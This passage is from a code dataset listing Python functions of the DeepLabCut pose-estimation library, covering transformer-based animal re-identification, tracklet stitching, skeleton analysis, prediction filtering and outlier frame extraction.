    - These triplets are later used to tran a transformer with triplet loss
    - The transformer derived appearance similarity is then used as a stitching loss when tracklets are
    stitched during tracking.

    Outputs: The tracklet file is saved in the same folder where the non-transformer tracklet file is stored.

    Parameters
    ----------
    config: string
        Full path of the config.yaml file as a string.

    videos: list
        A list of strings containing the full paths to videos for analysis or a path to the directory, where all the videos with same extension are stored.

    videotype: string, optional
        Checks for the extension of the video in case the input to the video is a directory.
 Only videos with this extension are analyzed.
        If left unspecified, videos with common extensions ('avi', 'mp4', 'mov', 'mpeg', 'mkv') are kept.

    shuffle : int, optional
        which shuffle to use

    trainingsetindex : int. optional
        which training fraction to use, identified by its index

    track_method: str, optional
        track method from which tracklets are sampled

    n_tracks: int
        number of tracks to be formed in the videos.
        TODO: handling videos with different number of tracks

    n_triplets: (optional) int
        number of triplets to be mined from the videos

    train_epochs: (optional), int
        number of epochs to train the transformer

    train_frac: (optional), fraction
        fraction of triplets used for training/testing of the transformer

    Examples
    --------

    Training model for one video based on ellipse-tracker derived tracklets
    >>> deeplabcut.transformer_reID(path_config_file,[''/home/alex/video.mp4'],track_method=""ellipse"")

    --------

    """"""
    import deeplabcut
    import os
    from deeplabcut.utils import auxiliaryfunctions
    cfg = auxiliaryfunctions.read_config(config)
    (DLCscorer, _) = deeplabcut.utils.auxiliaryfunctions.GetScorerName(cfg, shuffle=shuffle, trainFraction=cfg['TrainingFraction'][trainingsetindex], modelprefix=modelprefix)
    deeplabcut.pose_estimation_tensorflow.create_tracking_dataset(config, videos, track_method, videotype=videotype, shuffle=shuffle, trainingsetindex=trainingsetindex, modelprefix=modelprefix, n_triplets=n_triplets, destfolder=destfolder)
    (trainposeconfigfile, testposeconfigfile, snapshotfolder) = deeplabcut.return_train_network_path(config, shuffle=shuffle, modelprefix=modelprefix, trainingsetindex=trainingsetindex)
    deeplabcut.pose_tracking_pytorch.train_tracking_transformer(config, DLCscorer, videos, videotype=videotype, train_frac=train_frac, modelprefix=modelprefix, train_epochs=train_epochs, ckpt_folder=snapshotfolder, destfolder=destfolder)
    transformer_checkpoint = os.path.join(snapshotfolder, f'dlc_transreid_{train_epochs}.pth')
    if not os.path.exists(transformer_checkpoint):
        raise FileNotFoundError(f'checkpoint {transformer_checkpoint} not found')
    deeplabcut.stitch_tracklets(config, videos, videotype=videotype, shuffle=shuffle, trainingsetindex=trainingsetindex, track_method=track_method, modelprefix=modelprefix, n_tracks=n_tracks, transformer_checkpoint=transformer_checkpoint, destfolder=destfolder)"
AlexEMG/DeepLabCut,generate_train_triplets_from_pickle,"def generate_train_triplets_from_pickle(path_to_track, n_triplets=1000):
    ts = TrackletStitcher.from_pickle(path_to_track, 3)
    triplets = ts.mine(n_triplets)
    assert len(triplets) == n_triplets
    return triplets"
AlexEMG/DeepLabCut,save_train_triplets,"def save_train_triplets(feature_fname, triplets, out_name):
    ret_vecs = []
    feature_dict = shelve.open(feature_fname, protocol=pickle.DEFAULT_PROTOCOL)
    nframes = len(feature_dict.keys())
    zfill_width = int(np.ceil(np.log10(nframes)))
    for triplet in triplets:
        (anchor, pos, neg) = (triplet[0], triplet[1], triplet[2])
        (anchor_coord, anchor_frame) = anchor
        (pos_coord, pos_frame) = pos
        (neg_coord, neg_frame) = neg
        anchor_frame = 'frame' + str(anchor_frame).zfill(zfill_width)
        pos_frame = 'frame' + str(pos_frame).zfill(zfill_width)
        neg_frame = 'frame' + str(neg_frame).zfill(zfill_width)
        if anchor_frame in feature_dict and pos_frame in feature_dict and (neg_frame in feature_dict):
            anchor_vec = query_feature_by_coord_in_img_space(feature_dict, anchor_frame, anchor_coord)
            pos_vec = query_feature_by_coord_in_img_space(feature_dict, pos_frame, pos_coord)
            neg_vec = query_feature_by_coord_in_img_space(feature_dict, neg_frame, neg_coord)
            ret_vecs.append([anchor_vec, pos_vec, neg_vec])
    ret_vecs = np.array(ret_vecs)
    with open(out_name, 'wb') as f:
        np.save(f, ret_vecs)"
AlexEMG/DeepLabCut,create_train_using_pickle,"def create_train_using_pickle(feature_fname, path_to_pickle, out_name, n_triplets=1000):
    triplets = generate_train_triplets_from_pickle(path_to_pickle, n_triplets=n_triplets)
    save_train_triplets(feature_fname, triplets, out_name)"
AlexEMG/DeepLabCut,create_triplets_dataset,"def create_triplets_dataset(videos, dlcscorer, track_method, n_triplets=1000, destfolder=None):
    for video in videos:
        vname = Path(video).stem
        videofolder = str(Path(video).parents[0])
        if destfolder is None:
            destfolder = videofolder
        feature_fname = os.path.join(destfolder, vname + dlcscorer + '_bpt_features.pickle')
        method = trackingutils.TRACK_METHODS[track_method]
        track_file = os.path.join(destfolder, vname + dlcscorer + f'{method}.pickle')
        out_fname = os.path.join(destfolder, vname + dlcscorer + '_triplet_vector.npy')
        create_train_using_pickle(feature_fname, track_file, out_fname, n_triplets=n_triplets)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, checkpoint):
    self.checkpoint = checkpoint
    ckpt_dict = torch.load(self.checkpoint)
    self.model = build_dlc_transformer(cfg, ckpt_dict['feature_dim'], ckpt_dict['num_kpts'], inference_factory)
    self.cos = nn.CosineSimilarity(dim=1, eps=1e-06)
    print('loading params')
    self._load_params(ckpt_dict['state_dict'])
    self.model.double()
    self.model.eval()"
AlexEMG/DeepLabCut,_load_params,"def _load_params(self, params):
    self.model.load_state_dict(params)"
AlexEMG/DeepLabCut,_get_vec,"def _get_vec(self, inp_a, inp_b, zfill_width, feature_dict):
    (coord_a_img, frame_a) = inp_a
    (coord_b_img, frame_b) = inp_b
    frame_a = 'frame' + str(frame_a).zfill(zfill_width)
    frame_b = 'frame' + str(frame_b).zfill(zfill_width)
    vec_a = query_feature_by_coord_in_img_space(feature_dict, frame_a, coord_a_img)
    vec_b = query_feature_by_coord_in_img_space(feature_dict, frame_b, coord_b_img)
    return (vec_a, vec_b)"
AlexEMG/DeepLabCut,__call__,"def __call__(self, inp_a, inp_b, zfill_width, feature_dict, return_features=False):
    device = default_device('cuda')
    _tuple = self._get_vec(inp_a, inp_b, zfill_width, feature_dict)
    if _tuple is None:
        return None
    (vec_a, vec_b) = _tuple
    vec_a = np.expand_dims(vec_a, axis=0)
    vec_b = np.expand_dims(vec_b, axis=0)
    vec_a = torch.from_numpy(vec_a).double()
    vec_b = torch.from_numpy(vec_b).double()
    with torch.no_grad():
        vec_a.to(device)
        vec_b.to(device)
        vec_a = self.model(vec_a)
        vec_b = self.model(vec_b)
        dist = self.cos(vec_a, vec_b)
        if return_features:
            return (dist, vec_a, vec_b)
        else:
            return dist"
AlexEMG/DeepLabCut,set_seed,"def set_seed(seed):
    torch.manual_seed(seed)
    if torch.cuda.is_available():
        torch.cuda.manual_seed(seed)
        torch.cuda.manual_seed_all(seed)
    np.random.seed(seed)
    random.seed(seed)
    torch.backends.cudnn.deterministic = True
    torch.backends.cudnn.benchmark = True"
AlexEMG/DeepLabCut,split_train_test,"def split_train_test(npy_list, train_frac):
    x_list = []
    train_list = []
    test_list = []
    for npy in npy_list:
        vectors = np.load(npy)
        n_samples = vectors.shape[0]
        indices = np.random.permutation(n_samples)
        num_train = int(n_samples * train_frac)
        vectors = vectors[indices]
        train = vectors[:num_train]
        test = vectors[num_train:]
        train_list.append(train)
        test_list.append(test)
    train_list = np.concatenate(train_list, axis=0)
    test_list = np.concatenate(test_list, axis=0)
    return (train_list, test_list)"
AlexEMG/DeepLabCut,train_tracking_transformer,"def train_tracking_transformer(path_config_file, dlcscorer, videos, videotype='', train_frac=0.8, modelprefix='', train_epochs=100, batch_size=64, ckpt_folder='', destfolder=None):
    npy_list = []
    videos = auxiliaryfunctions.get_list_of_videos(videos, videotype)
    for video in videos:
        videofolder = str(Path(video).parents[0])
        if destfolder is None:
            destfolder = videofolder
        video_name = Path(video).stem
        files = glob.glob(os.path.join(destfolder, video_name + dlcscorer + '*.npy'))
        npy_list.append(files[0])
    (train_list, test_list) = split_train_test(npy_list, train_frac)
    (train_loader, val_loader) = make_dlc_dataloader(train_list, test_list, batch_size)
    num_kpts = train_list.shape[2]
    feature_dim = train_list.shape[-1]
    model = make_dlc_model(cfg, feature_dim, num_kpts)
    triplet_loss = easy_triplet_loss()
    optimizer = make_easy_optimizer(cfg, model)
    scheduler = create_scheduler(cfg, optimizer)
    num_query = 1
    do_dlc_train(cfg, model, triplet_loss, train_loader, val_loader, optimizer, scheduler, num_kpts, feature_dim, num_query, total_epochs=train_epochs, ckpt_folder=ckpt_folder)"
AlexEMG/DeepLabCut,calc_distance_between_points_two_vectors_2d,"def calc_distance_between_points_two_vectors_2d(v1, v2):
    """"""calc_distance_between_points_two_vectors_2d [pairwise distance between vectors points]

    Arguments:
        v1 {[np.array]} -- [description]
        v2 {[type]} -- [description]

    Raises:
        ValueError -- [description]
        ValueError -- [description]
        ValueError -- [description]

    Returns:
        [type] -- [description]

    testing:
    >>> v1 = np.zeros((2, 5))
    >>> v2 = np.zeros((2, 5))
    >>> v2[1, :]  = [0, 10, 25, 50, 100]
    >>> d = calc_distance_between_points_two_vectors_2d(v1.T, v2.T)
    """"""
    if not isinstance(v1, np.ndarray) or not isinstance(v2, np.ndarray):
        raise ValueError('Invalid argument data format')
    if not v1.shape[1] == 2 or not v2.shape[1] == 2:
        raise ValueError('Invalid shape for input arrays')
    if not v1.shape[0] == v2.shape[0]:
        raise ValueError('Error: input arrays should have the same length')
    dist = [distance.euclidean(p1, p2) for (p1, p2) in zip(v1, v2)]
    return dist"
AlexEMG/DeepLabCut,angle_between_points_2d_anticlockwise,"def angle_between_points_2d_anticlockwise(p1, p2):
    """"""angle_between_points_2d_clockwise [Determines the angle of a straight line drawn between point one and two.
        The number returned, which is a double in degrees, tells us how much we have to rotate
        a horizontal line anti-clockwise for it to match the line between the two points.]

    Arguments:
        p1 {[np.ndarray, list]} -- np.array or list [ with the X and Y coordinates of the point]
        p2 {[np.ndarray, list]} -- np.array or list [ with the X and Y coordinates of the point]

    Returns:
        [int] -- [clockwise angle between p1, p2 using the inner product and the deterinant of the two vectors]

    Testing:  - to check:     print(zero, ninety, oneeighty, twoseventy)
        >>> zero = angle_between_points_2d_clockwise([0, 1], [0, 1])
        >>> ninety = angle_between_points_2d_clockwise([1, 0], [0, 1])
        >>> oneeighty = angle_between_points_2d_clockwise([0, -1], [0, 1])
        >>> twoseventy = angle_between_points_2d_clockwise([-1, 0], [0, 1])
        >>> ninety2 = angle_between_points_2d_clockwise([10, 0], [10, 1])
        >>> print(ninety2)
    """"""
    '\n        Determines the angle of a straight line drawn between point one and two.\n        The number returned, which is a double in degrees, tells us how much we have to rotate\n        a horizontal line anit-clockwise for it to match the line between the two points.\n    '
    xDiff = p2[0] - p1[0]
    yDiff = p2[1] - p1[1]
    ang = degrees(atan2(yDiff, xDiff))
    if ang < 0:
        ang += 360
    return ang"
AlexEMG/DeepLabCut,calc_angle_between_vectors_of_points_2d,"def calc_angle_between_vectors_of_points_2d(v1, v2):
    """"""calc_angle_between_vectors_of_points_2d [calculates the clockwise angle between each set of point for two 2d arrays of points]

    Arguments:
        v1 {[np.ndarray]} -- [2d array with X,Y position at each timepoint]
        v2 {[np.ndarray]} -- [2d array with X,Y position at each timepoint]

    Returns:
        [np.ndarray] -- [1d array with clockwise angle between pairwise points in v1,v2]

    Testing:
    >>> v1 = np.zeros((2, 4))
    >>> v1[1, :] = [1, 1, 1, 1, ]
    >>> v2 = np.zeros((2, 4))
    >>> v2[0, :] = [0, 1, 0, -1]
    >>> v2[1, :] = [1, 0, -1, 0]
    >>> a = calc_angle_between_vectors_of_points_2d(v2, v1)
    """"""
    if v1 is None or v2 is None or (not isinstance(v1, np.ndarray)) or (not isinstance(v2, np.ndarray)):
        raise ValueError('Invalid format for input arguments')
    if len(v1) != len(v2):
        raise ValueError('Input arrays should have the same length, instead: ', len(v1), len(v2))
    if not v1.shape[0] == 2 or not v2.shape[0] == 2:
        raise ValueError('Invalid shape for input arrays: ', v1.shape, v2.shape)
    n_points = v1.shape[1]
    angs = np.zeros(n_points)
    for i in range(v1.shape[1]):
        (p1, p2) = (v1[:, i], v2[:, i])
        angs[i] = angle_between_points_2d_anticlockwise(p1, p2)
    return angs"
AlexEMG/DeepLabCut,analyzebone,"def analyzebone(bp1, bp2):
    """"""[Computes length and orientation of the bone at each frame]

    Arguments:
        bp1 {[type]} -- [description]
        bp2 {[type]} -- [description]
    """"""
    bp1_pos = np.vstack([bp1.x.values, bp1.y.values]).T
    bp2_pos = np.vstack([bp2.x.values, bp2.y.values]).T
    bone_length = calc_distance_between_points_two_vectors_2d(bp1_pos, bp2_pos)
    bone_orientation = calc_angle_between_vectors_of_points_2d(bp1_pos.T, bp2_pos.T)
    likelihoods = np.vstack([bp2.likelihood.values, bp2.likelihood.values]).T
    likelihood = np.min(likelihoods, 1)
    df = pd.DataFrame.from_dict(dict(length=bone_length, orientation=bone_orientation, likelihood=likelihood))
    return df"
AlexEMG/DeepLabCut,analyzeskeleton,"def analyzeskeleton(config, videos, videotype='', shuffle=1, trainingsetindex=0, filtered=False, save_as_csv=False, destfolder=None, modelprefix='', track_method='', return_data=False):
    """"""Extracts length and orientation of each ""bone"" of the skeleton.

    The bone and skeleton information is defined in the config file.

    Parameters
    ----------
    config: str
        Full path of the config.yaml file.

    videos: list[str]
        The full paths to videos for analysis or a path to the directory, where all the
        videos with same extension are stored.

    videotype: str, optional, default=""""
        Checks for the extension of the video in case the input to the video is a
        directory. Only videos with this extension are analyzed.
        If left unspecified, videos with common extensions
        ('avi', 'mp4', 'mov', 'mpeg', 'mkv') are kept.

    shuffle : int, optional, default=1
        The shuffle index of training dataset. The extracted frames will be stored in
        the labeled-dataset for the corresponding shuffle of training dataset.

    trainingsetindex: int, optional, default=0
        Integer specifying which TrainingsetFraction to use.
        Note that TrainingFraction is a list in config.yaml.

    filtered: bool, optional, default=False
        Boolean variable indicating if filtered output should be plotted rather than
        frame-by-frame predictions. Filtered version can be calculated with
        ``deeplabcut.filterpredictions``.

    save_as_csv: bool, optional, default=False
        Saves the predictions in a .csv file.

    destfolder: string or None, optional, default=None
        Specifies the destination folder for analysis data. If ``None``, the path of
        the video is used. Note that for subsequent analysis this folder also needs to
        be passed.

    modelprefix: str, optional, default=""""
        Directory containing the deeplabcut models to use when evaluating the network.
        By default, the models are assumed to exist in the project folder.

    track_method: string, optional, default=""""
        Specifies the tracker used to generate the data.
        Empty by default (corresponding to a single animal project).
        For multiple animals, must be either 'box', 'skeleton', or 'ellipse' and will
        be taken from the config.yaml file if none is given.

    return_data: bool, optional, default=False
        If True, returns a dictionary of the filtered data keyed by video names.

    Returns
    -------
    video_to_skeleton_df
        Dictionary mapping video filepaths to skeleton dataframes.

        * If no videos exist, the dictionary will be empty.
        * If a video is not analyzed, the corresponding value in the dictionary will be
          None.
    """"""
    cfg = auxiliaryfunctions.read_config(config)
    if not cfg['skeleton']:
        raise ValueError('No skeleton defined in the config.yaml.')
    video_to_skeleton_df = {}
    track_method = auxfun_multianimal.get_track_method(cfg, track_method=track_method)
    (DLCscorer, DLCscorerlegacy) = auxiliaryfunctions.get_scorer_name(cfg, shuffle, trainFraction=cfg['TrainingFraction'][trainingsetindex], modelprefix=modelprefix)
    Videos = auxiliaryfunctions.get_list_of_videos(videos, videotype)
    for video in Videos:
        print('Processing %s' % video)
        if destfolder is None:
            destfolder = str(Path(video).parents[0])
        vname = Path(video).stem
        try:
            (df, filepath, scorer, _) = auxiliaryfunctions.load_analyzed_data(destfolder, vname, DLCscorer, filtered, track_method)
        except FileNotFoundError as e:
            print(e)
            video_to_skeleton_df[video] = None
            continue
        output_name = filepath.replace('.h5', f'_skeleton.h5')
        if os.path.isfile(output_name):
            print(f'Skeleton in video {vname} already processed. Skipping...')
            video_to_skeleton_df[video] = pd.read_hdf(output_name, 'df_with_missing')
            continue
        bones = {}
        if 'individuals' in df.columns.names:
            for (animal_name, df_) in df.groupby(level='individuals', axis=1):
                temp = df_.droplevel(['scorer', 'individuals'], axis=1)
                if animal_name != 'single':
                    for (bp1, bp2) in cfg['skeleton']:
                        name = '{}_{}_{}'.format(animal_name, bp1, bp2)
                        bones[name] = analyzebone(temp[bp1], temp[bp2])
        else:
            for (bp1, bp2) in cfg['skeleton']:
                name = '{}_{}'.format(bp1, bp2)
                bones[name] = analyzebone(df[scorer][bp1], df[scorer][bp2])
        skeleton = pd.concat(bones, axis=1)
        video_to_skeleton_df[video] = skeleton
        skeleton.to_hdf(output_name, 'df_with_missing', format='table', mode='w')
        if save_as_csv:
            skeleton.to_csv(output_name.replace('.h5', '.csv'))
    if return_data:
        return video_to_skeleton_df"
AlexEMG/DeepLabCut,columnwise_spline_interp,"def columnwise_spline_interp(data, max_gap=0):
    """"""
    Perform cubic spline interpolation over the columns of *data*.
    All gaps of size lower than or equal to *max_gap* are filled,
    and data slightly smoothed.

    Parameters
    ----------
    data : array_like
        2D matrix of data.
    max_gap : int, optional
        Maximum gap size to fill. By default, all gaps are interpolated.

    Returns
    -------
    interpolated data with same shape as *data*
    """"""
    if np.ndim(data) < 2:
        data = np.expand_dims(data, axis=1)
    (nrows, ncols) = data.shape
    temp = data.copy()
    valid = ~np.isnan(temp)
    x = np.arange(nrows)
    for i in range(ncols):
        mask = valid[:, i]
        if np.sum(mask) > 3:
            spl = CubicSpline(x[mask], temp[mask, i])
            y = spl(x)
            if max_gap > 0:
                inds = np.flatnonzero(np.r_[True, np.diff(mask), True])
                count = np.diff(inds)
                inds = inds[:-1]
                to_fill = np.ones_like(mask)
                for (ind, n, is_nan) in zip(inds, count, ~mask[inds]):
                    if is_nan and n > max_gap:
                        to_fill[ind:ind + n] = False
                y[~to_fill] = np.nan
            y[y == 0] = np.nan
            temp[:, i] = y
    return temp"
AlexEMG/DeepLabCut,filterpredictions,"def filterpredictions(config, video, videotype='', shuffle=1, trainingsetindex=0, filtertype='median', windowlength=5, p_bound=0.001, ARdegree=3, MAdegree=1, alpha=0.01, save_as_csv=True, destfolder=None, modelprefix='', track_method='', return_data=False):
    """"""Fits frame-by-frame pose predictions.

    The pose predictions are fitted with ARIMA model (filtertype='arima') or median
    filter (default).

    Parameters
    ----------
    config : string
        Full path of the config.yaml file.

    video : string
        Full path of the video to extract the frame from. Make sure that this video is
        already analyzed.

    shuffle : int, optional, default=1
        The shuffle index of training dataset. The extracted frames will be stored in
        the labeled-dataset for the corresponding shuffle of training dataset.

    trainingsetindex: int, optional, default=0
        Integer specifying which TrainingsetFraction to use.
        Note that TrainingFraction is a list in config.yaml.

    filtertype: string, optional, default=""median"".
        The filter type - 'arima', 'median' or 'spline'.

    windowlength: int, optional, default=5
        For filtertype='median' filters the input array using a local window-size given
        by windowlength. The array will automatically be zero-padded.
        https://docs.scipy.org/doc/scipy/reference/generated/scipy.signal.medfilt.html.
        The windowlenght should be an odd number.
        If filtertype='spline', windowlength is the maximal gap size to fill.

    p_bound: float between 0 and 1, optional, default=0.001
        For filtertype 'arima' this parameter defines the likelihood below,
        below which a body part will be consided as missing data for filtering purposes.

    ARdegree: int, optional, default=3
        For filtertype 'arima' Autoregressive degree of Sarimax model degree.
        see https://www.statsmodels.org/dev/generated/statsmodels.tsa.statespace.sarimax.SARIMAX.html

    MAdegree: int, optional, default=1
        For filtertype 'arima' Moving Average degree of Sarimax model degree.
        See https://www.statsmodels.org/dev/generated/statsmodels.tsa.statespace.sarimax.SARIMAX.html

    alpha: float, optional, default=0.01
        Significance level for detecting outliers based on confidence interval of fitted SARIMAX model.

    save_as_csv: bool, optional, default=True
        Saves the predictions in a .csv file.

    destfolder: string, optional, default=None
        Specifies the destination folder for analysis data. If ``None``, the path of
        the video is used by default. Note that for subsequent analysis this folder
        also needs to be passed.

    modelprefix: str, optional, default=""""
        Directory containing the deeplabcut models to use when evaluating the network.
        By default, the models are assumed to exist in the project folder.

    track_method: string, optional, default=""""
        Specifies the tracker used to generate the data.
        Empty by default (corresponding to a single animal project).
        For multiple animals, must be either 'box', 'skeleton', or 'ellipse' and will
        be taken from the config.yaml file if none is given.

    return_data: bool, optional, default=False
        If True, returns a dictionary of the filtered data keyed by video names.

    Returns
    -------
    video_to_filtered_df
        Dictionary mapping video filepaths to filtered dataframes.

        * If no videos exist, the dictionary will be empty.
        * If a video is not analyzed, the corresponding value in the dictionary will be
          None.

    Examples
    --------

    Arima model:

    >>> deeplabcut.filterpredictions(
            'C:\\myproject\\reaching-task\\config.yaml',
            ['C:\\myproject\\trailtracking-task\\test.mp4'],
            shuffle=3,
            filterype='arima',
            ARdegree=5,
            MAdegree=2,
        )

    Use median filter over 10 bins:

    >>> deeplabcut.filterpredictions(
            'C:\\myproject\\reaching-task\\config.yaml',
            ['C:\\myproject\\trailtracking-task\\test.mp4'],
            shuffle=3,
            windowlength=10,
        )

    One can then use the filtered rather than the frame-by-frame predictions by calling:

    >>> deeplabcut.plot_trajectories(
            'C:\\myproject\\reaching-task\\config.yaml',
            ['C:\\myproject\\trailtracking-task\\test.mp4'],
            shuffle=3,
            filtered=True,
        )

    >>> deeplabcut.create_labeled_video(
            'C:\\myproject\\reaching-task\\config.yaml',
            ['C:\\myproject\\trailtracking-task\\test.mp4'],
            shuffle=3,
            filtered=True,
        )
    """"""
    cfg = auxiliaryfunctions.read_config(config)
    track_method = auxfun_multianimal.get_track_method(cfg, track_method=track_method)
    (DLCscorer, DLCscorerlegacy) = auxiliaryfunctions.get_scorer_name(cfg, shuffle, trainFraction=cfg['TrainingFraction'][trainingsetindex], modelprefix=modelprefix)
    Videos = auxiliaryfunctions.get_list_of_videos(video, videotype)
    video_to_filtered_df = {}
    if not len(Videos):
        print(""No video(s) were found. Please check your paths and/or 'videotype'."")
        if return_data:
            return video_to_filtered_df
    for video in Videos:
        if destfolder is None:
            destfolder = str(Path(video).parents[0])
        print('Filtering with %s model %s' % (filtertype, video))
        vname = Path(video).stem
        try:
            (df, filepath, _, _) = auxiliaryfunctions.load_analyzed_data(destfolder, vname, DLCscorer, True, track_method)
            print(f'Data from {vname} were already filtered. Skipping...')
            video_to_filtered_df[video] = df
            continue
        except FileNotFoundError:
            pass
        try:
            (df, filepath, _, _) = auxiliaryfunctions.load_analyzed_data(destfolder, vname, DLCscorer, track_method=track_method)
        except FileNotFoundError as e:
            video_to_filtered_df[video] = None
            print(e)
            continue
        nrows = df.shape[0]
        if filtertype == 'arima':
            temp = df.values.reshape((nrows, -1, 3))
            placeholder = np.empty_like(temp)
            for i in range(temp.shape[1]):
                (x, y, p) = temp[:, i].T
                (meanx, _) = FitSARIMAXModel(x, p, p_bound, alpha, ARdegree, MAdegree, False)
                (meany, _) = FitSARIMAXModel(y, p, p_bound, alpha, ARdegree, MAdegree, False)
                meanx[0] = x[0]
                meany[0] = y[0]
                placeholder[:, i] = np.c_[meanx, meany, p]
            data = pd.DataFrame(placeholder.reshape((nrows, -1)), columns=df.columns, index=df.index)
        elif filtertype == 'median':
            data = df.copy()
            mask = data.columns.get_level_values('coords') != 'likelihood'
            data.loc[:, mask] = df.loc[:, mask].apply(signal.medfilt, args=(windowlength,), axis=0)
        elif filtertype == 'spline':
            data = df.copy()
            mask_data = data.columns.get_level_values('coords').isin(('x', 'y'))
            xy = data.loc[:, mask_data].values
            prob = data.loc[:, ~mask_data].values
            missing = np.isnan(xy)
            xy_filled = columnwise_spline_interp(xy, windowlength)
            filled = ~np.isnan(xy_filled)
            xy[filled] = xy_filled[filled]
            inds = np.argwhere(missing & filled)
            if inds.size:
                inds[:, 1] //= 2
                inds = np.unique(inds, axis=0)
                prob[inds[:, 0], inds[:, 1]] = 0.01
                data.loc[:, ~mask_data] = prob
            data.loc[:, mask_data] = xy
        else:
            raise ValueError(f'Unknown filter type {filtertype}')
        video_to_filtered_df[video] = data
        outdataname = filepath.replace('.h5', '_filtered.h5')
        data.to_hdf(outdataname, 'df_with_missing', format='table', mode='w')
        if save_as_csv:
            print('Saving filtered csv poses!')
            data.to_csv(outdataname.split('.h5')[0] + '.csv')
    if return_data:
        return video_to_filtered_df"
AlexEMG/DeepLabCut,find_outliers_in_raw_data,"def find_outliers_in_raw_data(config, pickle_file, video_file, pcutoff=0.1, percentiles=(5, 95), with_annotations=True, extraction_algo='kmeans', copy_videos=False):
    """"""
    Extract outlier frames from either raw detections or assemblies of multiple animals.

    Parameter
    ----------
    config : str
        Absolute path to the project config.yaml.

    pickled_file : str
        Path to a *_full.pickle or *_assemblies.pickle.

    video_file : str
        Path to the corresponding video file for frame extraction.

    pcutoff : float, optional (default=0.1)
        Detection confidence threshold below which frames are flagged as
        containing outliers. Only considered if raw detections are passed in.

    percentiles : tuple, optional (default=(5, 95))
        Assemblies are considered outliers if their areas are beyond the 5th
        and 95th percentiles. Must contain a lower and upper bound.

    with_annotations : bool, optional (default=True)
        If true, extract frames and the corresponding network predictions.
        Otherwise, only the frames are extracted.

    extraction_algo : string, optional (default=""kmeans"")
        Outlier detection algorithm. Must be either ``uniform`` or ``kmeans``.

    copy_videos : bool, optional (default=False)
        If True, newly-added videos (from which outlier frames are extracted) are
        copied to the project folder. By default, symbolic links are created instead.

    """"""
    if extraction_algo not in ('kmeans', 'uniform'):
        raise ValueError(f'Unsupported extraction algorithm {extraction_algo}.')
    video_name = Path(video_file).stem
    pickle_name = Path(pickle_file).stem
    if not pickle_name.startswith(video_name):
        raise ValueError('Video and pickle files do not match.')
    with open(pickle_file, 'rb') as file:
        data = pickle.load(file)
    if pickle_file.endswith('_full.pickle'):
        (inds, data) = find_outliers_in_raw_detections(data, threshold=pcutoff)
        with_annotations = False
    elif pickle_file.endswith('_assemblies.pickle'):
        assemblies = dict()
        for (k, lst) in data.items():
            if k == 'single':
                continue
            ass = []
            for vals in lst:
                a = inferenceutils.Assembly(len(vals))
                a.data = vals
                ass.append(a)
            assemblies[k] = ass
        inds = inferenceutils.find_outlier_assemblies(assemblies, qs=percentiles)
    else:
        raise IOError(f'Raw data file {pickle_file} could not be parsed.')
    cfg = auxiliaryfunctions.read_config(config)
    ExtractFramesbasedonPreselection(inds, extraction_algo, data, video=video_file, cfg=cfg, config=config, savelabeled=False, with_annotations=with_annotations, copy_videos=copy_videos)"
AlexEMG/DeepLabCut,find_outliers_in_raw_detections,"def find_outliers_in_raw_detections(pickled_data, algo='uncertain', threshold=0.1, kept_keypoints=None):
    """"""
    Find outlier frames from the raw detections of multiple animals.

    Parameter
    ----------
    pickled_data : dict
        Data in the *_full.pickle file obtained after `analyze_videos`.

    algo : string, optional (default=""uncertain"")
        Outlier detection algorithm. Currently, only 'uncertain' is supported
        for multi-animal raw detections.

    threshold: float, optional (default=0.1)
        Detection confidence threshold below which frames are flagged as
        containing outliers. Only considered if `algo`==`uncertain`.

    kept_keypoints : list, optional (default=None)
        Indices in the list of labeled body parts to be kept of the analysis.
        By default, all keypoints are used for outlier search.

    Returns
    -------
    candidates : list
        Indices of video frames containing potential outliers
    """"""
    if algo != 'uncertain':
        raise ValueError(f""Only method 'uncertain' is currently supported."")
    try:
        _ = pickled_data.pop('metadata')
    except KeyError:
        pass

    def get_frame_ind(s):
        return int(re.findall('\\d+', s)[0])
    candidates = []
    data = dict()
    for (frame_name, dict_) in pickled_data.items():
        frame_ind = get_frame_ind(frame_name)
        temp_coords = dict_['coordinates'][0]
        temp = dict_['confidence']
        if kept_keypoints is not None:
            temp_coords = [temp_coords[i] for i in kept_keypoints]
            temp = [temp[i] for i in kept_keypoints]
        coords = np.concatenate(temp_coords)
        conf = np.concatenate(temp)
        data[frame_ind] = np.c_[coords, conf].squeeze()
        if np.any(conf < threshold):
            candidates.append(frame_ind)
    return (candidates, data)"
AlexEMG/DeepLabCut,extract_outlier_frames,"def extract_outlier_frames(config, videos, videotype='', shuffle=1, trainingsetindex=0, outlieralgorithm='jump', frames2use=None, comparisonbodyparts='all', epsilon=20, p_bound=0.01, ARdegree=3, MAdegree=1, alpha=0.01, extractionalgorithm='kmeans', automatic=False, cluster_resizewidth=30, cluster_color=False, opencv=True, savelabeled=False, copy_videos=False, destfolder=None, modelprefix='', track_method=''):
    """"""Extracts the outlier frames.

    Extracts the outlier frames if the predictions are not correct for a certain video
    from the cropped video running from start to stop as defined in config.yaml.

    Another crucial parameter in config.yaml is how many frames to extract
    ``numframes2extract``.

    Parameters
    ----------
    config: str
        Full path of the config.yaml file.

    videos : list[str]
        The full paths to videos for analysis or a path to the directory, where all the
        videos with same extension are stored.

    videotype: str, optional, default=""""
        Checks for the extension of the video in case the input to the video is a
        directory. Only videos with this extension are analyzed.
        If left unspecified, videos with common extensions
        ('avi', 'mp4', 'mov', 'mpeg', 'mkv') are kept.

    shuffle : int, optional, default=1
        The shuffle index of training dataset. The extracted frames will be stored in
        the labeled-dataset for the corresponding shuffle of training dataset.

    trainingsetindex: int, optional, default=0
        Integer specifying which TrainingsetFraction to use.
        Note that TrainingFraction is a list in config.yaml.

    outlieralgorithm: str, optional, default=""jump"".
        String specifying the algorithm used to detect the outliers.

        * ``'Fitting'`` fits a Auto Regressive Integrated Moving Average model to the
          data and computes the distance to the estimated data. Larger distances than
          epsilon are then potentially identified as outliers
        * ``'jump'`` identifies larger jumps than 'epsilon' in any body part
        * ``'uncertain'`` looks for frames with confidence below p_bound
        * ``'manual'`` launches a GUI from which the user can choose the frames
        * ``'list'`` looks for user to provide a list of frame numbers to use, 'frames2use'. In this case, ``'extractionalgorithm'`` is forced to be ``'uniform.'``

    frames2use: list[str], optional, default=None
        If ``'outlieralgorithm'`` is ``'list'``, provide the list of frames here.

    comparisonbodyparts: list[str] or str, optional, default=""all""
        This selects the body parts for which the comparisons with the outliers are
        carried out. If ``""all""``, then all body parts from config.yaml are used. If a
        list of strings that are a subset of the full list E.g. ['hand','Joystick'] for
        the demo Reaching-Mackenzie-2018-08-30/config.yaml to select only these body
        parts.

    p_bound: float between 0 and 1, optional, default=0.01
